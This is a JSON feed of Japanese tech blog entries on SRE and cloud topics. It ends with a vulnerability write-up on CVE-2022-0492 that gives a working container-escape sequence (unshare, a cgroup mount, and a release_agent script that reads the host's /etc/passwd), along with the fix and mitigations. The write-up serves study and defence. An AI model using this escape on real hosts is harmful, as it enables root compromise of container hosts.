株式会社スリーシェイク.","link":"https://sreake.com/blog/datadog_cost_filter/","isoDate":"2022-06-28T03:04:27.000Z","dateMiliSeconds":1656385467000,"authorName":"Sreake","authorId":"Sreake"},{"title":"S3にアーカイブしたDatadogのログを復元する","contentSnippet":"Datadogのログにまつわるお話を紹介させていただきます！今回はアーカイブされたログをDatadogで見たい場合どのように復元していくのかについてご紹介しますThe post S3にアーカイブしたDatadogのログを復元する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/s3_datadog_log/","isoDate":"2022-06-28T03:04:23.000Z","dateMiliSeconds":1656385463000,"authorName":"Sreake","authorId":"Sreake"},{"title":"インフラコードのテストツール Terratest を触ってみた","contentSnippet":"Terratest の概要 公式HP:\xa0https://terratest.gruntwork.io/ Githubリポジトリ:\xa0https://github.com/gruntwork-io/ter […]The post インフラコードのテストツール Terratest を触ってみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/learn-about-terratest/","isoDate":"2022-06-27T00:43:53.000Z","dateMiliSeconds":1656290633000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AWS SAP 合格体験記 2022/06","contentSnippet":"はじめにネットで公開されている数々のAWS Certified Solutions Architect - Professionalの合格体験記や勉強法などにお世話になったので自分も書いてみることにしました。教材選びや学習スケジュールの参考になれば嬉しいです。 私の前提知識まず、本題に入る前に私のSAPを受ける前までのスキルセットを軽く紹介させてください。業務でのAWS歴は8ヶ月ほどで現在SREとして働いています以前はRuby on Railsなどを書くプログラマーをやっていましたAWS SAAは2022/03に取得しましたAWSではない他のIT資格は以下で...","link":"https://zenn.dev/tayusa/articles/7b3dd99a79403c","isoDate":"2022-06-24T00:36:49.000Z","dateMiliSeconds":1656031009000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"golangでHTTP3を試してみる","contentSnippet":"はじめについ先日、HTTP3がRFC9114として正式に発表されました。https://blog.cloudflare.com/cloudflare-view-http3-usage/RFC読むよりとりあえずパケット見る派なので、とりあえずコード書いて動かしてキャプチャしたいところです。quic-goは http3 ディレクトリがあり、対応してそうなのでサンプルコードを書いてみました。数日前にcommitが入っていて開発も活発そうですね。サンプルのサーバ側コードを試す時はお手数ですが、opensslやmkcertコマンドなどでご自分で公開鍵&秘密鍵を生成してくださ...","link":"https://zenn.dev/satoken/articles/golang-hajimete-http3","isoDate":"2022-06-14T00:42:51.000Z","dateMiliSeconds":1655167371000,"authorName":"satoken","authorId":"satoken"},{"title":"istio-proxyがどのように通信を仲介しているかを知る","contentSnippet":"目的前回、書いた記事で素のKubernetesのネットワークについて少し理解できたのですが、Istioを入れた場合はEnvoyが通信を仲介するのでその仕組みを知りたく調べてみましたhttps://zenn.dev/tayusa/articles/c705cd65b6ee74 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 クラスタのセットアップ kindでクラスタ作成https:...","link":"https://zenn.dev/tayusa/articles/aa54bbff3d0d2d","isoDate":"2022-06-03T18:42:53.000Z","dateMiliSeconds":1654281773000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"【Codezine掲載】システムの信頼性を高める、クラウドネイティブ実践のコツとは？ 青山真也氏\xd7スリーシェイクが語る「これまで」と「これから」","contentSnippet":"「デベロッパーの成長と課題解決に貢献するメディア」をコンセプトに情報発信を行うソフトウェア開発者向けWebメディア「Codezine」に、Srekae事業部部長手塚の対談記事が掲載されました。The post 【Codezine掲載】システムの信頼性を高める、クラウドネイティブ実践のコツとは？ 青山真也氏\xd7スリーシェイクが語る「これまで」と「これから」 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/codezine_cloudnative/","isoDate":"2022-06-03T06:31:00.000Z","dateMiliSeconds":1654237860000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Karpenter について調べてみた","contentSnippet":"2021年の re:invent にて GA となったことが発表された、Karpenter について調べてみたのでその共有となります。 公式HP: https://karpenter.sh/ リポジトリ: https:/ […]The post Karpenter について調べてみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/learn-about-karpenter/","isoDate":"2022-05-30T01:38:25.000Z","dateMiliSeconds":1653874705000,"authorName":"Sreake","authorId":"Sreake"},{"title":"asdf のバージョン アップがうまくいかなかった","contentSnippet":"最近、転職により業務環境が Windows から Mac に変わったことで、ツール類のバージョン管理として asdf を使用しはじめました。asdf 自体のバージョンアップがうまくいかない事象に直面したため、解決方法をメモしておきます。 サマリHomebrew により asdf をバージョンアップしたら、asdf でインストールしたツールが使用できなくなりました。shim ディレクトリ内のスクリプトに記述された asdf のパスが古いバージョンとなっていたことが原因でした。shim ディレクトリを別のディレクトリに移動後、asdf reshim を実行することで shim デ...","link":"https://zenn.dev/kyohei_saito/articles/40a13800f34d5f","isoDate":"2022-05-29T09:36:54.000Z","dateMiliSeconds":1653817014000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"KubernetesのServiceの挙動を確認する","contentSnippet":"目的普段、Kubernetesを触ってはいるのですが、表面的な使い方しか知らないので動きを確認してみます 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 ひとまず、ローカルでクラスタを立てる環境に応じてkindをインストールhttps://kind.sigs.k8s.io/docs/user/quick-start/#installationクラスタの作成$ kind ...","link":"https://zenn.dev/tayusa/articles/c705cd65b6ee74","isoDate":"2022-05-28T12:19:47.000Z","dateMiliSeconds":1653740387000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"istio-proxy 停止時の挙動","contentSnippet":"istio の sidecar である pilot-agent, envoy が Pod の終了時にどう振る舞うのかをまとめてみました。 デフォルトの istio-proxy Pod Delete されたタイミングで各コ […]The post istio-proxy 停止時の挙動 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/istio-proxy-stop-behavior/","isoDate":"2022-05-26T00:17:32.000Z","dateMiliSeconds":1653524252000,"authorName":"Sreake","authorId":"Sreake"},{"title":"リモートワークのナレッジ","contentSnippet":"ここ最近リモートワークですが、辛くないですか？とか、〜なときどうしているんですか？みたいなことを複数件聞かれたりしています。自宅で仕事をするようになって2年と半年ぐらいになった男の意識していることや環境のことを共有してみ […]The post リモートワークのナレッジ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/remote-work-knowledge/","isoDate":"2022-05-25T00:15:51.000Z","dateMiliSeconds":1653437751000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Goで立てたWebサーバーでソケットを学ぶ","contentSnippet":"目的TCPなどにまるで明るくないので、学習のために調べてみました 環境Arch Linux(5.17.9-arch1-1)go version go1.18.3 linux/amd64 やることGoで書いたWebサーバーを動かして挙動を確認したり、少しコードを見てみますコードは以下ですpackage mainimport (\\t\\"fmt\\"\\t\\"log\\"\\t\\"net/http\\"\\t\\"time\\")func main() {\\thttp.HandleFunc(\\"/\\", func(w http.ResponseWriter, r *http.Request)...","link":"https://zenn.dev/tayusa/articles/077d911b357a92","isoDate":"2022-05-22T12:32:11.000Z","dateMiliSeconds":1653222731000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"golangで作るHTTP2プロトコル","contentSnippet":"はじめに前回まででTLS1.3+HTTPのプロトコルスタックの自作に成功しました。自作したのはHTTP1.1です。皆さんご存知のように新しいVersionのHTTP2が普及されています。今回はHTTP2プロトコルスタックを自作してみようと思います。今回の方針です。net/http2 は使わない自作したコードでリクエストをnginxに送りhtmlが返ってくればヨシ！HTTP2でGETを送るgoのコードの処理を自作したということなので、HTTP2自体を全部作ってるわけではなく一部になります、ご承知おきください\uD83D\uDE47‍♂️\uD83D\uDE47‍♂️\uD83D\uDE47‍♂️またHTTP2自体の解説より実装中...","link":"https://zenn.dev/satoken/articles/golang-http2","isoDate":"2022-05-16T12:00:30.000Z","dateMiliSeconds":1652702430000,"authorName":"satoken","authorId":"satoken"},{"title":"golangで作るTLS1.3プロトコル","contentSnippet":"はじめに前回までの記事でTLS1.2プロトコルスタックを自作してみました。ただ皆さんご存知の通り、TLS1.2の脆弱性の対策やQUICなど新しいプロトコルへの対応を考慮して設計したTLS1.3が2018年にリリースされ普及が進んでいます。使用率ではまだTLS1.2が一般的ですが今後は1.3へと置き換えが進んでいくと、どこかの時点で逆転するのでしょう。そのときに慌てて学ぶよりも、今1.3も実装して学ぶことにします\uD83D\uDE0Aまぁ1.2作れたしイケるでしょう(死亡フラグ\uD83D\uDE07\uD83D\uDE07\uD83D\uDE07)今回の実装方針です。crypto/tls は一切使わずTLS1.3のフルハンドシェイクをオレオレで実装する...","link":"https://zenn.dev/satoken/articles/golang-tls1_3","isoDate":"2022-05-06T13:25:32.000Z","dateMiliSeconds":1651843532000,"authorName":"satoken","authorId":"satoken"},{"title":"ProtocolBuffers/gRPCを安全に書き進めるためのエトセトラ","contentSnippet":"OWASP Fukuoka Meeting #6 \\rhttps://owasp-kyushu.connpass.com/event/244388/ \\r#owaspfukuoka","link":"https://speakerdeck.com/nwiizo/protocol-buffers-grpc-wo-an-quan-nishu-kijin-merutamefalseetosetora","isoDate":"2022-04-27T04:00:00.000Z","dateMiliSeconds":1651032000000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"golangで作るTLS1.2プロトコル(ECDHE&クライアント認証編)","contentSnippet":"はじめに前回TLS1.2プロトコルスタックを自作してみましたが、実装が及んでない部分がありました。1つは鍵交換がRSAだけになっているのともう1つはクライアント認証に対応していないところです。RSAではその仕組み上セキュリティ的に脆弱な点がありますし、サーバからクライアント認証を求められたら対応できませんので機能追加を行います。まずはECDHE鍵交換の対応から行います。 ECHDE鍵交換前回の記事でも書きましたがRSAでは毎回同じ公開鍵でpremaster secretを暗号化するため、秘密鍵が一旦漏れてしまうとそれまでの通信が全て復号される可能性があります。このRS...","link":"https://zenn.dev/satoken/articles/golang-tls1_2_2","isoDate":"2022-04-22T02:03:50.000Z","dateMiliSeconds":1650593030000,"authorName":"satoken","authorId":"satoken"},{"title":"zennの執筆環境向けdevcontainerを作成した話","contentSnippet":"タイトルまんまでzennの執筆環境向けdevcontainerを作成したという話です前々からzennの記事はGithub repositoryと連携して書いており、codespaceにvscodeから接続して執筆してたのですが、zenn-cliを使ったプレビューが可能らしいということを最近知ったので、devcontainerの勉強がてらサクッとプレビューが可能な環境を作りましたという内容になります作ったdevcontainerのリポジトリはこちらですhttps://github.com/bells17/zenn-template 使い方READMEに書いてある通りですが、te...","link":"https://zenn.dev/bells17/articles/zenn-devcontainer","isoDate":"2022-04-17T15:27:41.000Z","dateMiliSeconds":1650209261000,"authorName":"bells17","authorId":"bells17"},{"title":"golangで作るTLS1.2プロトコル","contentSnippet":"はじめに前回自作でTCPIP+HTTPを実装して動作を確認することができました。しかしご覧頂いた方はおわかりのように、通信はHTTP=平文でやり取りされておりパスワードなど機密情報が用意に見れてしまう状態です。普段我々がブラウザに安心してパスワードを入力しているのは通信がTLSで暗号化されているからです。ではそのTLSの仕組みはどうなっているのでしょう？恥ずかしい限りですが僕はわかりません。\uD83D\uDE07\uD83D\uDE07\uD83D\uDE07ということで以下を読みながらTLSプロトコルを自作してみてその仕組みを学ぶことにします。マスタリングTCP/IP情報セキュリティ編RFC5246プロフェッショナルSSL/T...","link":"https://zenn.dev/satoken/articles/golang-tls1_2","isoDate":"2022-04-16T03:22:38.000Z","dateMiliSeconds":1650079358000,"authorName":"satoken","authorId":"satoken"},{"title":"[2022/04/15] 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"普段は#kubenewsの2022年04月15日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/j76uphcYs2E 告知とかニュースっぽいもの Kubernetes Meetup TokyoでLTする予定ですhttps...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220415","isoDate":"2022-04-15T12:50:24.000Z","dateMiliSeconds":1650027024000,"authorName":"bells17","authorId":"bells17"},{"title":"吉祥寺.pm29で久しぶりにLTしてきました #kichijojipm","contentSnippet":"kichijojipm.connpass.com久しぶりにLTしてきました。久しぶりに外で発表したいなと思いつつ、だいぶブランクあるのでちょうどいいリハビリできるところがないかな。— masasuzu (@masasuz) 2022年4月9日  こんなこと考えてたら良いタイミングできちぴーが開催されるので、LT申し込んでみました。#kichijojipm 7年ぶりにLTしたので緊張した。というのと、前回の発表調べて7年前もきちぴーあったのかという驚きもあった。— masasuzu (@masasuz) 2022年4月12日  どうやら7年ぶりだったみたいです。タイミング的に最終出社日の翌日だったので、キャリアの話をしました。diary.masasuzu.net正直、LTにおさまる量じゃなかったのは反省点です。資料ももうちょっとなんとかできたかなあという気持ちがあります。少しずつ登壇回数増やして、勘を取り戻していきたいところ。","link":"https://blog.masasuzu.net/entry/2022/04/15/202342","isoDate":"2022-04-15T11:23:42.000Z","dateMiliSeconds":1650021822000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"CVE-2022-0492 調査まとめ","contentSnippet":"cgroups v1 の脆弱性 CVE-2022-0492 について、調査した内容をまとめました。イベントで発表した内容ですが、時間の都合で語りきれなかった部分も多く、内容を加筆してブログに書くことにしました。 speakerdeck.comCVE-2022-0492 概要release_agent についてエクスプロイト前提条件要点検証修正パッチコンテナセキュリティseccompAppArmor (SELinux)Kubernetes の場合EKS, GKE の場合さいごに参考リンクCVE-2022-0492LinuxコンテナセキュリティCVE-2022-0492 概要CVE-2022-0492 は cgroups v1 における特権昇格・コンテナブレイクアウトの脆弱性です。cgroups v1 の release_agent 機能を悪用することで、コンテナからホストの root 権限で任意コマンド実行が可能となります。詳細は後述しますが、これは本来特権コンテナに限定されるべき設定が、capabilities のチェック漏れにより非特権コンテナから行える状態だったことが原因です。本脆弱性は seccomp や AppArmor/SELinux を有効にすることで回避可能です。release_agent についてcgroups v1 は cpu, memory, pids のようにリソースをサブシステムに分割し、各サブシステムがディレクトリ構造を取っています。# ls /sys/fs/cgroup/blkio  cpu,cpuacct  cpuset   freezer  memory  net_cls           net_prio    pids  systemdcpu    cpuacct      devices  hugetlb  misc    net_cls,net_prio  perf_event  rdma  unifiedrelease_agent は各 cgroup サブシステムのルートディレクトリに配置されるファイルで、cgroup 内のプロセスが終了する時に起動させるプログラムを設定します。リリースエージェントプログラム の起動の有無は、cgroup ディレクトリ内の notify_on_release の値で判断されます。このファイルはルート以下、各 child cgroup のディレクトリにも配置されています。notify_on_release = 1 の場合、リリースエージェントプログラムを起動します。cgroup のディレクトリ構成pids cgroup のルートディレクトリを見ると、以下のように release_agent, notify_on_release のファイルを確認できます。# ls /sys/fs/cgroup/pids/cgroup.clone_children  cgroup.sane_behavior  docker      notify_on_release  system.slice  user.slicecgroup.procs           default               init.scope  release_agent      tasks# cat /sys/fs/cgroup/pids/release_agent   ← 空のファイル# cat /sys/fs/cgroup/pids/notify_on_release 0ちなみにコンテナに CAP_SYS_ADMIN がある場合、release_agent を使えば本脆弱性を利用することなくブレイクアウト可能です。https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)また cgroups v2 には release_agent がなく、リリースの通知は別の仕組みを使っています。エクスプロイト前提条件本脆弱性は次の条件を全て満たす場合に影響があります。root ユーザーまたは、no_new_privsフラグなしでコンテナを起動しているseccomp, AppArmor/SELinux がいずれも有効でないホストの非特権ユーザー名前空間が有効（ubuntu ではデフォルトの設定です）各設定の確認方法↓# cat /proc/sys/kernel/unprivileged_userns_clone   ← 非特権ユーザ名前空間1# cat /proc/self/status | grep Seccomp   ← seccompSeccomp:    0Seccomp_filters:    0# cat /proc/self/attr/current   ← AppArmordocker-default (enforce)要点コンテナから cgroups の release_agent に書き込みたいrdma サブシステムは root cgroup に所属しているが、readonly でマウントされているcgroup を rw で新たにマウントしたいが、マウントには CAP_SYS_ADMIN が必要unshare で user namespace (ns) を作成すれば CAP_SYS_ADMIN が得られるcgroup, mount ns も同時に作成することで cgroup をマウント可能にrdma cgroup をマウント すると release_agent に書き込み可能cgroup 内のプロセスが終了するタイミングで、任意のプログラムをホストの root 権限で実行検証脆弱な Kernel バージョンで CVE-2022-0492 を検証します。インスタンスに用意した ubuntu 上で、seccomp, AppArmor をオフにした docker コンテナを起動します。# uname -aLinux ip-172-31-1-29 5.13.0-1017-aws #19~20.04.1-Ubuntu SMP Mon Mar 7 12:53:12 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashdocker はコンテナ作成時に cgroup ns を作成しないので、コンテナはホストと同じ cgroup ns に所属しています。自身の cgroup を確認すれば root cgroup からのパスがわかるため、コンテナ内から各サブシステムが root cgroup に所属しているかどうか調べることができます。root@ab988587a245:/# cat /proc/self/cgroup13:misc:/12:rdma:/   ← rdma サブシステムは root cgroup11:hugetlb:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a10:cpuset:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a9:net_cls,net_prio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a8:perf_event:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a7:blkio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a6:devices:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a5:freezer:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a4:cpu,cpuacct:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a3:pids:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a2:memory:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a1:name=systemd:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a0::/system.slice/containerd.serviceこれで rdma サブシステムが root cgroup に所属していることがわかりました。root@ab988587a245:/# mount | grep \'cgroup (ro\'cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)   ← readonly でマウントされているcgroup on /sys/fs/cgroup/misc type cgroup (ro,nosuid,nodev,noexec,relatime,misc)root@ab988587a245:/# ls -l /sys/fs/cgroup/rdma/total 0-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.clone_children-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.procs-r--r--r--  1 root root 0 Mar 15 01:40 cgroup.sane_behavior-rw-r--r--  1 root root 0 Mar 15 01:40 notify_on_release-rw-r--r--  1 root root 0 Mar 29 16:01 release_agentdrwxr-xr-x 13 root root 0 Mar 26 21:07 system.slice-rw-r--r--  1 root root 0 Mar 15 01:40 tasksroot@ab988587a245:/# echo test > /sys/fs/cgroup/rdma/release_agent bash: /sys/fs/cgroup/rdma/release_agent: Read-only file system   ← 書き込みエラーというわけで、cgroup を rw でマウントできれば良いことになります。ここで capability を確認すると、コンテナは CAP_SYS_ADMIN を持っておらず、このままでは cgroup をマウントする権限がありません。root@ab988587a245:/# apt update && apt install -y libcap2-binroot@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 00000000a80425fbroot@ab988587a245:/# capsh --decode=00000000a80425fb0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcaproot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mntmount: /mnt: permission denied.   ← マウントエラーCAP_SYS_ADMIN を付与するため user ns を作成し新たにプロセスを立ち上げます。さらに mount, cgroup ns を同時に作成することで、コンテナ内でのマウントが可能になります。マウントさえできれば release_agent に書き込むことができます。root@ab988587a245:/# unshare -rmC bash   ← user, mount, cgroup ns を作成root@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 000001ffffffffffroot@ab988587a245:/# capsh --decode=000001ffffffffff0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40   ← CAP_SYS_ADMIN を持つroot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mnt   ← rdma サブシステムをマウントroot@ab988587a245:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@ab988587a245:/# mount | grep \'cgroup (rw\'cgroup on /mnt type cgroup (rw,relatime,rdma)ここまでで、コンテナ内から release_agent に書き込めるようになりました。続いてコンテナ内のルート (/) に、ホストの権限で実行させたいプログラムを配置します。今回は /etc/passwd をコンテナ内に出力するスクリプトを作成しています。release_agent に設定するのはプログラムのパスですが、ホストから見た絶対パスを指定する必要があります。root@ab988587a245:/# host_path=`sed -n \'s/.*\\\\perdir=\\\\([^,]*\\\\).*/\\\\1/p\' /etc/mtab`root@ab988587a245:/# echo $host_path/var/lib/docker/overlay2/20c4102a1a817b0e564734054b876c051732c62f4993ce682508ac7cd7fcb1c6/diff   ← upperdir のパスroot@ab988587a245:/# echo \\"$host_path/cmd\\" > /mnt/release_agentroot@ab988587a245:/# echo \'#!/bin/sh\' > /cmdroot@ab988587a245:/# echo \\"cat /etc/passwd > $host_path/output\\" >> /cmdroot@ab988587a245:/# chmod a+x /cmd最後に用意したプログラムを起動するため、cgroup 内のプロセスを空にします。root@ab988587a245:/# mkdir /mnt/xx   ← child cgroup を作成root@ab988587a245:/# ls /mnt/xx/cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasksroot@ab988587a245:/# echo 1 > /mnt/xx/notify_on_releaseroot@ab988587a245:/# sh -c \\"echo \\\\$\\\\$\\" > /mnt/xx/cgroup.procs   ← すぐに終了するプロセスを child cgroup に追加root@ab988587a245:/# cat /output   ← コンテナ内にホストの /etc/passwd が出力されているroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologin...修正パッチhttps://github.com/torvalds/linux/commit/24f6008564183aa120d07c03d9289519c2fe02afhttps://github.com/torvalds/linux/commit/467a726b754f474936980da793b4ff2ec3e382a7  static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of, char *buf, size_t nbytes, loff_t off)  {    struct cgroup *cgrp;+   struct cgroup_file_ctx *ctx;    BUILD_BUG_ON(sizeof(cgrp->root->release_agent_path) < PATH_MAX);+   /*+    * Release agent gets called with all capabilities,+    * require capabilities to set release agent.+    */+   ctx = of->priv;+   if ((ctx->ns->user_ns != &init_user_ns) ||+       !file_ns_capable(of->file, &init_user_ns, CAP_SYS_ADMIN))+     return -EPERM;    cgrp = cgroup_kn_lock_live(of->kn, false);修正後は上記検証手順での release_agent への書き込みはできません。これは書き込みプロセスが CAP_SYS_ADMIN は持ちますが、init user ns でないためだと理解しています。init user ns かつ CAP_SYS_ADMIN を同時に満たすのは、非特権コンテナにおいては不可能となりました。（厳密にはプロセスの capability と、対象 cgroup の所有 user ns のチェックを行なっています）# uname -r5.17.0-051700rc7-generic# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@a45e44c77da9:/# unshare -rmC bashroot@a45e44c77da9:/# mount -t cgroup -o rdma cgroup /mntroot@a45e44c77da9:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@a45e44c77da9:/# echo test > /mnt/release_agent bash: echo: write error: Operation not permittedただし特権コンテナでは引き続きコンテナブレイクアウトは可能です。SELinux を設定する等の対策は必要です。コンテナセキュリティコンテナセキュリティと本脆弱性の関係について簡単に見ていきます。seccompseccomp はコンテナ内で実行できるシステムコールを制限します。システムコールをブロックするため、ns を作成する段階でエラーとなります。# docker run --rm -it --security-opt apparmor=unconfined ubuntu bashroot@fb3522b81478:/# cat /proc/self/status | grep SeccompSeccomp:    2Seccomp_filters:    1root@fb3522b81478:/# unshare -rmC bashunshare: unshare failed: Operation not permittedAppArmor (SELinux)ファイル操作、プログラム実行、capabilities 等を制限します。# docker run --rm -it --security-opt seccomp=unconfined ubuntu bashroot@46912ffebb2c:/# cat /proc/self/attr/current docker-default (enforce)root@46912ffebb2c:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission deniedKubernetes の場合Kubernetes においては、seccomp や AppArmor/SELinux は環境や設定次第では OFF のため影響が出る可能性があります。AppArmor/SELinux は Kubernetes ノードやコンテナランタイムで有効にする必要があります。さらに seccomp は Pod のマニフェストにも設定しなければなりません。また securityContext に適切な設定をすることも重要です。allowPrivilegeEscalation, readOnlyRootFilesystem, capabilities 等でコンテナの機能を制限すれば、今後生まれる脆弱性の予防にもなると考えます。EKS, GKE の場合EKS のノードに使われる Amazon Linux 2 では、rdma のようなコンテナ内に root cgroup がマウントされたサブシステムはないようです。このため cgroup を新規にマウントしても release_agent は見えず、本脆弱性を悪用することはできません。# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@287fcd93a54f:/# cat /proc/self/cgroup 11:pids:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b010:devices:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b09:hugetlb:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b08:perf_event:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b07:net_cls,net_prio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b06:blkio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b05:memory:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b04:cpu,cpuacct:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b03:freezer:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b02:cpuset:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b01:name=systemd:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b0GKE のノードに使われる COS では、デフォルトで AppArmor が有効になっているようです。(https://cloud.google.com/container-optimized-os/docs/how-to/secure-apparmor)$ k run ubuntu --image ubuntu -- sleep 3600pod/ubuntu created$ k exec -it ubuntu -- bashroot@ubuntu:/# cat /proc/self/attr/current cri-containerd.apparmor.d (enforce)root@ubuntu:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission denied以上のことから EKS, GKE では本脆弱性の影響はなさそうです。さいごに本脆弱性の調査を通じて、コンテナを構成する Linux の要素技術やコンテナセキュリティへの理解が深まりました。Linux 